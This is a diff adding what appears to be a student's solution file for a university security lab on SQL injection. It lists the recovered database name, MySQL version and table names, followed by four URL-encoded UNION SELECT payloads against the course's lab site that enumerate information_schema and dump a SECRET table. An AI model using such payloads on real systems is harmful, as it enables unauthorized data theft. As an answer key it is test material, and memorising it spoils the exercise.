@@ -1,0 +1,9 @@
+proj2_inject3
+5.5.60-0ubuntu0.14.04.1
+HINT, SECRET, foo, inject3_users
+temporal
+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+%27%27%2C+database%28%29%2C+%27%27%2C+%27%27%3B+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+%27%27%2C+version%28%29%2C+%27%27%2C+%27%27%3B+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+table_name%2C+table_name%2C+table_type%2C+group_concat%28table_name+separator+%27%2C+%27%29+from+information_schema.tables+where+table_type%3D%27base+table%27%23
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+secret%2Csecret%2Chash%2Chash+FROM+SECRET+%3B+--+
